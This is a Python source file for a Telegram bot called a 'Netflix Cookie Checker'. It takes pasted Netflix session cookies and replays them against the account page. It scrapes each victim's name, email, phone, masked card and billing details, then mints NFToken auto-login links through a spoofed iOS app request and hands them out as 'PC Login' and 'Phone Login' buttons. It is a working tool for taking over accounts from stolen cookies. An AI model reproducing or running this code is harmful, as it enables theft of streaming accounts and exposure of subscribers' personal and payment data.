import copy
import html
import json
import os
import random
import re
import shutil
import string
import sys
import time
import unicodedata
import zipfile
from datetime import datetime, timedelta, timezone
from io import BytesIO

import requests
from urllib3.exceptions import InsecureRequestWarning

# Telegram imports
try:
    from telegram import Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("Install: pip install python-telegram-bot==20.7")
    sys.exit(1)

try:
    import yaml
except ImportError:
    yaml = None

# ==================== READ BOT TOKEN ====================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN environment variable not set!")
    sys.exit(1)

# ==================== CONFIGURATION ====================
DEFAULT_CONFIG = {
    "txt_fields": {
        "name": True, "email": True, "max_streams": True, "plan_price": True,
        "plan": True, "country": True, "member_since": True, "next_billing": True,
        "extra_members": True, "payment_method": True, "card": True, "phone": True,
        "quality": True, "hold_status": True, "email_verified": True,
        "membership_status": True, "profiles": True, "user_guid": False,
    },
    "nftoken": "both",
    "add_emojis": "webhook",
    "notifications": {
        "webhook": {"enabled": False, "url": "", "mode": "full", "plans": "all"},
        "telegram": {"enabled": False, "bot_token": "", "chat_id": "", "mode": "full", "plans": "all"},
    },
    "display": {"mode": "simple"},
    "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
    "performance": {
        "request_timeout_seconds": 15,
        "fallback_account_page": False,
        "retry_incomplete_info": False,
        "nftoken_for_free": False,
    },
}

APP_VERSION = "4.5.0"

# Folders
cookies_folder = "cookies"
output_folder = "output"
failed_folder = "failed"
broken_folder = "broken"
proxy_file = "proxy.txt"

# Bot stats
bot_application = None
stats = {"total": 0, "valid": 0, "free": 0, "failed": 0, "processing": 0}
user_tasks = {}

# NFToken API settings
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# ==================== HELPER FUNCTIONS ====================

def create_base_folders():
    for folder in [cookies_folder, output_folder, failed_folder, broken_folder]:
        os.makedirs(folder, exist_ok=True)
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# Add your proxies here\n")

def load_config():
    config_yaml_path = "config.yml"
    if os.path.exists(config_yaml_path):
        if yaml is None:
            return copy.deepcopy(DEFAULT_CONFIG), "default"
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config), config_yaml_path
        except Exception:
            with open(config_yaml_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_YAML_CONFIG)
            return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path
    with open(config_yaml_path, "w", encoding="utf-8") as f:
        f.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path

def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged

def clean_text(text):
    if not text:
        return None
    text = html.unescape(text)
    text = text.replace('\\x20', ' ')
    text = text.replace('\\x40', '@')
    text = text.replace('\\u00A0', ' ')
    text = text.replace('&nbsp;', ' ')
    text = text.replace('\\x2F', '/')
    text = text.replace('\\"', '"')
    text = re.sub(r'\\x[0-9a-fA-F]{2}', '', text)
    return text.strip()

def decode_netflix_value(value):
    if value is None:
        return None
    return clean_text(str(value))

def extract_first_match(response_text, patterns=[]):
    for pattern in patterns:
        match = re.search(pattern, response_text, re.I)
        if match:
            return decode_netflix_value(match.group(1))
    return None

def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    return cleaned.lower() in {"true", "yes", "1", "on", "verified"}

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None

def normalize_phone_number(phone, country_code=None):
    if not phone:
        return None
    cleaned = re.sub(r'\D', '', str(phone))
    if not cleaned:
        return phone
    if len(cleaned) >= 10:
        return f"+{cleaned}"
    return cleaned

def get_full_country_name(country_code):
    countries = {
        "ES": "Spain", "US": "United States", "GB": "United Kingdom",
        "IN": "India", "PK": "Pakistan", "RO": "Romania", "ZA": "South Africa"
    }
    return countries.get(country_code.upper(), country_code)

def clean_profile_names(profiles_raw):
    if not profiles_raw:
        return [], 0
    forbidden_names = ['android', 'tablet', 'apple', 'windows', 'chrome', 'firefox', 'safari', 'premium', 'standard', 'basic', 'free']
    names_list = [p.strip() for p in profiles_raw.split(",") if p.strip()]
    clean_names = []
    for name in names_list:
        name_lower = name.lower()
        if name_lower in forbidden_names:
            continue
        if len(name) < 2:
            continue
        skip = False
        for forbidden in forbidden_names:
            if forbidden in name_lower:
                skip = True
                break
        if skip:
            continue
        clean_names.append(name)
    return clean_names, len(clean_names)

def get_membership_status_display(status):
    status_map = {"current_member": "Active", "former_member": "Cancelled"}
    return status_map.get(normalize_plan_key(status), status or "Unknown")

def extract_payment_method_strong(info):
    payment = info.get("paymentMethodType")
    if payment and payment != "Unknown":
        if payment.upper() == "CC":
            return "CC"
        return payment
    card = info.get("maskedCard")
    if card and card != "Unknown":
        return "CC"
    return "Unknown"


# ==================== COOKIE EXTRACTION ====================

def is_netflix_domain(domain):
    domain = str(domain or "").lower()
    return "netflix." in domain

ALL_NETFLIX_COOKIE_NAMES = {"NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"}

def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    return bool(cookie_dict.get("NetflixId"))

def extract_netflix_cookie_bundles(content):
    bundles = []
    cookies = {}
    
    # Try JSON format
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if isinstance(cookie, dict) and cookie.get("name") in ALL_NETFLIX_COOKIE_NAMES:
                    cookies[cookie["name"]] = cookie.get("value", "")
        else:
            if data.get("name") in ALL_NETFLIX_COOKIE_NAMES:
                cookies[data["name"]] = data.get("value", "")
    except:
        pass
    
    # Try netscape format
    if not cookies:
        for line in content.splitlines():
            if line.startswith("#"):
                continue
            parts = line.split()
            if len(parts) >= 7:
                name = parts[5]
                if name in ALL_NETFLIX_COOKIE_NAMES:
                    cookies[name] = parts[6]
    
    # Try raw text
    if not cookies:
        for name in ALL_NETFLIX_COOKIE_NAMES:
            match = re.search(rf'{name}[=: ]+([^\s;,\"\']+)', content, re.I)
            if match:
                cookies[name] = match.group(1).strip("\"'")
    
    if cookies:
        bundles.append({"cookies": cookies})
    
    return bundles


# ==================== ACCOUNT INFO EXTRACTION ====================

def get_name_from_profiles(info):
    profiles_raw = info.get("profiles") or ""
    if profiles_raw:
        clean_names, _ = clean_profile_names(profiles_raw)
        if clean_names:
            return clean_names[0]
    return "Unknown"

def has_any_account_info(info):
    if not info:
        return False
    return any(info.get(f) for f in ["countryOfSignup", "membershipStatus", "localizedPlanName"])

def extract_info(response_text):
    info = {}
    
    # Extract from JSON/GraphQL
    try:
        data = json.loads(response_text)
        if isinstance(data, dict):
            ga = data.get("data", {}).get("growthAccount", {})
            if ga:
                info['accountOwnerName'] = decode_netflix_value(ga.get('ownerName'))
                info['email'] = decode_netflix_value(ga.get('email'))
                info['countryOfSignup'] = decode_netflix_value(ga.get('countryOfSignUp', {}).get('code'))
                info['memberSince'] = decode_netflix_value(ga.get('memberSince'))
                info['membershipStatus'] = decode_netflix_value(ga.get('membershipStatus'))
                info['nextBillingDate'] = decode_netflix_value(ga.get('nextBillingDate', {}).get('localDate'))
                cur_plan = ga.get('currentPlan', {}).get('plan', {})
                info['localizedPlanName'] = decode_netflix_value(cur_plan.get('name'))
                info['planPrice'] = decode_netflix_value(cur_plan.get('priceDisplay'))
                info['videoQuality'] = decode_netflix_value(cur_plan.get('videoQuality'))
                info['maxStreams'] = cur_plan.get('maxStreams')
                info['paymentMethodType'] = decode_netflix_value(ga.get('paymentMethodType'))
                info['maskedCard'] = decode_netflix_value(ga.get('maskedCard'))
                phone = ga.get('growthLocalizablePhoneNumber', {})
                info['phoneNumber'] = normalize_phone_number(phone.get('rawPhoneNumber'))
                info['phoneVerified'] = phone.get('isVerified', False)
                profiles = ga.get('profiles', [])
                profile_names = [p.get('name') for p in profiles if p.get('name')]
                info['profiles'] = ", ".join(profile_names) if profile_names else None
    except:
        pass
    
    # Fallback HTML extraction
    if not has_any_account_info(info):
        info['accountOwnerName'] = extract_first_match(response_text, [r'"ownerName":"([^"]+)"', r'"accountOwnerName":"([^"]+)"'])
        info['email'] = extract_first_match(response_text, [r'"email":"([^"]+)"'])
        info['countryOfSignup'] = extract_first_match(response_text, [r'"currentCountry":"([^"]+)"'])
        info['memberSince'] = extract_first_match(response_text, [r'"memberSince":"([^"]+)"'])
        info['membershipStatus'] = extract_first_match(response_text, [r'"membershipStatus":"([^"]+)"'])
        info['maxStreams'] = extract_first_match(response_text, [r'"maxStreams":(\d+)'])
        info['localizedPlanName'] = extract_first_match(response_text, [r'"localizedPlanName":"([^"]+)"', r'"planName":"([^"]+)"'])
        info['profiles'] = extract_first_match(response_text, [r'"profiles":"([^"]+)"', r'"profileName":"([^"]+)"'])
    
    return info if has_any_account_info(info) else {}

def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    return re.sub(r"[^\w]+", "_", plan_name.lower()).strip("_")

def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    if not is_subscribed and not raw_plan:
        return "free", "Free"
    norm = normalize_plan_key(raw_plan) if raw_plan else ""
    if norm in ("premium", "premium_plan"):
        return "premium", "Premium"
    if norm in ("standard", "estandar"):
        return "standard", "Standard"
    if norm in ("basic", "basico"):
        return "basic", "Basic"
    streams = info.get("maxStreams")
    if streams:
        try:
            streams = int(str(streams))
            if streams >= 4:
                return "premium", "Premium"
            if streams >= 2:
                return "standard", "Standard"
        except:
            pass
    return "unknown", "Unknown"

def is_subscribed_account(info):
    status = normalize_plan_key(info.get("membershipStatus"))
    return status in ["current_member", "active", "current"]

def is_extra_member_account(info):
    plan = str(info.get("localizedPlanName", "")).lower()
    return "extra" in plan

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %d, %Y")
    except:
        pass
    return cleaned

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %Y")
    except:
        pass
    return cleaned

def country_code_to_flag(country_code):
    raw = decode_netflix_value(country_code) or ""
    if len(raw) == 2 and raw.isalpha():
        return "".join(chr(127397 + ord(c)) for c in raw.upper())
    return ""

def format_country_with_flag(country_value):
    country_code = decode_netflix_value(country_value) or "Unknown"
    country_name = get_full_country_name(country_code)
    flag = country_code_to_flag(country_code)
    return f"{country_name} {flag}".strip()

def get_nftoken_mode(config):
    val = config.get("nftoken", "both")
    if isinstance(val, bool):
        return "both" if val else "false"
    return str(val).lower()

def has_usable_nftoken(data):
    return data and data.get("token")

def create_nftoken(cookie_dict, attempts=1):
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        resp = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=30, verify=False)
        if resp.status_code != 200:
            return None, f"HTTP {resp.status_code}"
        data = resp.json()
        token_data = data.get("value", {}).get("account", {}).get("token", {}).get("default", {})
        token = token_data.get("token")
        if token:
            expiry = (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")
            return {"token": token, "expires_at_utc": expiry}, None
    except:
        pass
    return None, "Failed"

def get_account_page(session, proxy=None, timeout=15):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    resp = session.get("https://www.netflix.com/YourAccount", headers=headers, timeout=timeout)
    if resp.status_code == 200:
        return resp.text, resp.status_code, extract_info(resp.text)
    return resp.text, resp.status_code, None


# ==================== RESULT FORMATTING ====================

def format_result_beautiful(info, is_subscribed, nftoken_data=None):
    """Format result without frames, with emojis, and inline buttons"""
    
    _, plan_label = derive_plan_info(info, is_subscribed)
    
    name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
    if name.lower() in ['chrome', 'firefox', 'safari', 'edge', 'opera']:
        name = get_name_from_profiles(info)
    
    email = decode_netflix_value(info.get("email")) or "Unknown"
    email = clean_text(email)
    
    country = format_country_with_flag(info.get("countryOfSignup"))
    
    plan = plan_label
    price = decode_netflix_value(info.get("planPrice")) or "N/A"
    member_since = format_member_since(info.get("memberSince")) or "Unknown"
    next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
    payment = extract_payment_method_strong(info)
    card = decode_netflix_value(info.get("maskedCard")) or "N/A"
    phone = decode_netflix_value(info.get("phoneNumber")) or "N/A"
    phone_verified = "Yes" if parse_boolean_value(info.get("phoneVerified")) else "No"
    quality = decode_netflix_value(info.get("videoQuality")) or "Unknown"
    streams = str(info.get("maxStreams") or "Unknown").rstrip("}")
    hold = "No" if parse_boolean_value(info.get("isUserOnHold")) != True else "Yes"
    extra_member = "Yes" if is_extra_member_account(info) else "No"
    email_verified = "Yes" if parse_boolean_value(info.get("emailVerified")) else "No"
    membership_status = get_membership_status_display(info.get("membershipStatus"))
    
    profiles_raw = info.get("profiles") or ""
    clean_profiles, _ = clean_profile_names(profiles_raw)
    profiles_count = len(clean_profiles) if clean_profiles else 0
    profiles_display = ", ".join(clean_profiles) if clean_profiles else "None"
    
    lines = []
    lines.append("✅ Check completed successfully")
    lines.append("")
    lines.append("Status: Valid Premium Account")
    lines.append("")
    lines.append("Account Details:")
    lines.append(f"👤 Name: {name}")
    lines.append(f"📧 Email: {email}")
    lines.append(f"🌍 Country: {country}")
    lines.append(f"📦 Plan: {plan}")
    
    if is_subscribed:
        if price != "N/A":
            lines.append(f"💰 Price: {price}")
        lines.append(f"📅 Member Since: {member_since}")
        lines.append(f"🗓️ Next Billing: {next_billing}")
        lines.append(f"💳 Payment: {payment}")
        if card != "N/A":
            lines.append(f"💳 Card: {card}")
        lines.append(f"📱 Phone: {phone} ({phone_verified})")
        lines.append(f"🎬 Quality: {quality}")
        lines.append(f"📺 Streams: {streams}")
        lines.append(f"⏸️ Hold Status: {hold}")
        lines.append(f"👥 Extra Member: {extra_member}")
        lines.append(f"✅ Email Verified: {email_verified}")
        lines.append(f"🛡️ Membership Status: {membership_status}")
    
    lines.append(f"👥 Connected Profiles: {profiles_count}")
    lines.append(f"👤 Profiles: {profiles_display}")
    lines.append("")
    lines.append("Account Filter: Premium Only")
    lines.append("Mode: Full Information")
    
    result_text = "\n".join(lines)
    
    # Create inline keyboard buttons
    keyboard = []
    if nftoken_data and has_usable_nftoken(nftoken_data):
        keyboard = [
            [
                InlineKeyboardButton("🖥️ PC Login", callback_data=f"nftoken_pc_{nftoken_data['token']}"),
                InlineKeyboardButton("📱 Phone Login", callback_data=f"nftoken_phone_{nftoken_data['token']}")
            ]
        ]
        result_text += f"\n\n🔑 NFToken Login Links:\n⏳ Valid Until (UTC): {nftoken_data['expires_at_utc']}"
    
    return result_text, InlineKeyboardMarkup(keyboard) if keyboard else None


# ==================== HANDLERS ====================

async def handle_text_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if 'NetflixId' not in text or len(text) < 50:
        return
    
    status_msg = await update.message.reply_text("🔍 Cookie detected! Processing...")
    
    try:
        bundles = extract_netflix_cookie_bundles(text)
        
        if not bundles:
            await status_msg.edit_text("❌ No valid Netflix cookies found.")
            return
        
        bundle = bundles[0]
        cookies = bundle.get("cookies", {})
        
        if not cookies or not has_required_netflix_cookies(cookies):
            await status_msg.edit_text("❌ Invalid cookies - NetflixId required.")
            return
        
        await status_msg.edit_text("🔄 Connecting to Netflix...")
        
        session = requests.Session()
        session.cookies.update(cookies)
        config, _ = load_config()
        
        response_text, status_code, info = get_account_page(session, None, 15)
        
        if status_code == 200 and info and info.get("countryOfSignup"):
            is_subscribed = is_subscribed_account(info)
            
            nftoken_data = None
            nftoken_mode = get_nftoken_mode(config)
            if nftoken_mode != "false" and is_subscribed:
                nftoken_data, _ = create_nftoken(cookies, 1)
            
            result_text, reply_markup = format_result_beautiful(info, is_subscribed, nftoken_data)
            
            await status_msg.delete()
            await update.message.reply_text(result_text, reply_markup=reply_markup)
            
            stats['total'] += 1
            if is_subscribed:
                stats['valid'] += 1
            else:
                stats['free'] += 1
        else:
            await status_msg.edit_text(f"❌ Failed: HTTP {status_code}")
            stats['failed'] += 1
            
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")
        stats['failed'] += 1


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    if data.startswith("nftoken_pc_"):
        token = data.replace("nftoken_pc_", "")
        await query.message.reply_text(f"🖥️ PC Login:\nhttps://netflix.com/?nftoken={token}")
    elif data.startswith("nftoken_phone_"):
        token = data.replace("nftoken_phone_", "")
        await query.message.reply_text(f"📱 Phone Login:\nhttps://netflix.com/unsupported?nftoken={token}")
    
    await query.answer()


async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    first_name = user.first_name if user.first_name else "User"
    
    await update.message.reply_text(f"""
🎬 Netflix Cookie Checker Bot
⚡ Developer: Eyad 🚀

✨ Welcome {first_name}! ✨

📌 WHAT I DO:
   ✅ Verify Netflix cookies
   ✅ Extract premium account details

⚙️ HOW TO USE:
   1️⃣ Send cookie files (.txt or .json)
   2️⃣ Or send ZIP archive
   3️⃣ Or paste cookie text directly

🕹️ COMMANDS:
   /start      → Show menu
   /help       → Instructions
   /stats      → Statistics
   /tokenonly  → Token-only mode
   /fullinfo   → Full details mode
   /cancel     → Stop current task

🔽 USE THE MENU BUTTON BELOW FOR COMMANDS
""")

async def bot_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
📖 HELP & INSTRUCTIONS

STEP 1: Get Cookies
   Use browser extension "Cookie-Editor"

STEP 2: Send to Bot
   - Send .txt or .json file
   - OR send ZIP with multiple files
   - OR paste cookie text directly

STEP 3: Get Results
   - Full account details with emojis
   - NFToken login buttons

🔽 USE THE MENU BUTTON FOR COMMANDS
""")

async def bot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"""
📊 BOT STATISTICS

Total processed: {stats['total']}
✅ Valid Premium accounts: {stats['valid']}
🆓 Free accounts: {stats['free']}
❌ Failed/Invalid: {stats['failed']}
🔄 Currently processing: {stats['processing']}

🤖 Bot is running normally
""")

async def bot_tokenonly(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'tokenonly'
    await update.message.reply_text("🔑 Token Only Mode - ACTIVATED")

async def bot_fullinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'fullinfo'
    await update.message.reply_text("📋 Full Info Mode - ACTIVATED")

async def bot_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in user_tasks and user_tasks[uid].get('active'):
        user_tasks[uid]['cancel'] = True
        await update.message.reply_text("⏹️ Cancellation requested")
    else:
        await update.message.reply_text("ℹ️ No active task")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Please paste the cookie text directly in the chat, or send a ZIP file.")

async def set_commands(app):
    commands = [
        BotCommand("start", "Show menu"),
        BotCommand("help", "Instructions"),
        BotCommand("stats", "Statistics"),
        BotCommand("tokenonly", "Token only mode"),
        BotCommand("fullinfo", "Full details mode"),
        BotCommand("cancel", "Stop task"),
    ]
    await app.bot.set_my_commands(commands)


# ==================== MAIN ====================

def main():
    create_base_folders()
    print("\n" + "="*50)
    print("Netflix Cookie Checker Bot")
    print("="*50)
    print("Bot is starting...")
    print("="*50)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", bot_start))
    app.add_handler(CommandHandler("help", bot_help))
    app.add_handler(CommandHandler("stats", bot_stats))
    app.add_handler(CommandHandler("tokenonly", bot_tokenonly))
    app.add_handler(CommandHandler("fullinfo", bot_fullinfo))
    app.add_handler(CommandHandler("cancel", bot_cancel))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_cookie))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    import asyncio
    try:
        asyncio.get_event_loop().run_until_complete(set_commands(app))
    except Exception as e:
        print(f"Could not set commands: {e}")
    
    print("Bot is ready! Send /start on Telegram")
    print("Press Ctrl+C to stop\n")
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBot stopped")
